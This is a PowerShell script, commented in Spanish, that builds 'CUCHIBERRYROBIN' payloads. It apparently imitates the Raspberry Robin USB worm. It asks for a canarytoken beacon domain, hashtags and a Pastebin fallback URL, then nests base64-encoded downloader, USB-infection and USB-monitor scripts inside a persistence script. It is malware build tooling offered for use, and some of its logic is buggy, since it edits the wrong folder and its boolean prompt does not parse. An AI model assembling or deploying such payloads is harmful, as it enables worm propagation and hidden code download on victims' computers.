﻿$mensaje = "Vamos a preparar cargas de CUCHIBERRYROBIN!" # mensaje a mostrar

$longitudMensaje = $mensaje.Length + 2 # longitud del mensaje más dos espacios para los bordes
$bordes = "-" * $longitudMensaje # línea de bordes
$espacios = " " * $longitudMensaje # línea de espacios

$mensajeArt = @"
 $bordes
< $mensaje >
 $bordes
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
$espacios
"@

Write-Host $mensajeArt
Write-Host "Te voy a hacer unas preguntas"
$Conf_CharSet = Read-Host "Que nombre quieres poner a tu distribución?"
$Conf_dnsToken = Read-Host "Pon el dominio base de tu canarytoken.org?"
$Conf_Hashtag_init = Read-Host "Con que hashtag quieres que inicie?"
$Conf_Hashtag_end = Read-Host "Con que hashtag quieres que acabe?"
$Conf_pastebin_backup = Read-Host "URL de pastebin donde quieres que descargue si no encuentra el hashtag"
$Conf_Ballon= ""
# Preguntar al usuario si la variable es verdadera o falsa
$Conf_Ballon_in = Read-Host "Quieres que muestre mensajes en el escritorio cuando se procesa un USB? (1 true ó 0 false)"

# Convertir la entrada del usuario en un valor booleano
[bool]$Conf_Ballon = $null
if([bool]::TryParse($Conf_Ballon_in, [ref]$Conf_Ballon)) {
    Write-Host "La variable es $($Conf_Ballon)"
}
else {
    Write-Host "Entrada inválida. Por favor, ingrese 'true' o 'false'."
}


# Copiar la carpeta original a la carpeta temporal
Copy-Item -Path "./src" -Destination ."/tmp" -Recurse -Force



#extracion de todos los ficheros:
# Obtener todas las rutas de archivo en la subcarpeta actual y sus subcarpetas
$archivos = Get-ChildItem -Path ".\subcarpeta\" -Recurse | Where-Object { $_.Extension -eq ".ps1" }

foreach ($archivo in $archivos) {
    $contenido = Get-Content $archivo.FullName
    for ($i = 0; $i -lt $contenido.Count; $i++) {
        
        if ($contenido[$i] -match '^\$Conf_CharSet=') {
            $contenido[$i] = "`$Conf_CharSet=`"$Conf_CharSet`""
        }
        if ($contenido[$i] -match '^\$Conf_dnsToken=') {
            $contenido[$i] = "`$Conf_dnsToken=`"$Conf_dnsToken`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_init=') {
            $contenido[$i] = "`$Conf_Hashtag_init=`"$Conf_Hashtag_init`""
        }
        if ($contenido[$i] -match '^\$Conf_Hashtag_end=') {
            $contenido[$i] = "`$Conf_Hashtag_end=`"$Conf_Hashtag_end`""
        }
        if ($contenido[$i] -match '^\$Conf_pastebin_backup=') {
            $contenido[$i] = "`$Conf_pastebin_backup=`"$Conf_pastebin_backup`""
        }
        
        if ($contenido[$i] -match '^\$Conf_Ballon=') {
            $contenido[$i] = "`$Conf_Ballon=`"$Conf_Ballon`""
        }
    }
    Set-Content $archivo.FullName $contenido
}



#a por ficheor USB_IN

# Obtener el contenido actual del archivo persister.ps1
$USBin_contenido = Get-Content "./tmp/USBin.ps1"
# Convertir el contenido del archivo usbin.ps1 a base64
$Downloader_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/Downloader.ps1") -Encoding UTF8))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$USBin_contenido = $USBin_contenido -replace '(?<=^\$downloader= @\().+(?=\))', "`n'$Downloader_base64'"
# Escribir el contenido actualizado en el archivo persister.ps1
Set-Content "./tmp/USBin.ps1" $USBin_contenido

#a preprar el persister:


# Obtener el contenido actual del archivo persister.ps1
$persister_contenido = Get-Content "./tmp/Persister.ps1"
# Convertir el contenido del archivo usbin.ps1 a base64
$usbin_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/USBin.ps1") -Encoding UTF8))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$persister_contenido = $persister_contenido -replace '(?<=^\$file1= @\().+(?=\))', "`n'$usbin_base64'"

$monitor_base64 = [Convert]::ToBase64String((Get-Content ("./tmp/MonitorUSB.ps1") -Encoding UTF8))
# Reemplazar la definición de la variable line1 con una definición que incluya el contenido en base64 del archivo usbin.ps1
$persister_contenido = $persister_contenido -replace '(?<=^\$file2= @\().+(?=\))', "`n'$monitor_base64'"

#meter el downloader en USB_IN



# Escribir el contenido actualizado en el archivo persister.ps1
Set-Content "./tmp/Persister.ps1" $persister_contenido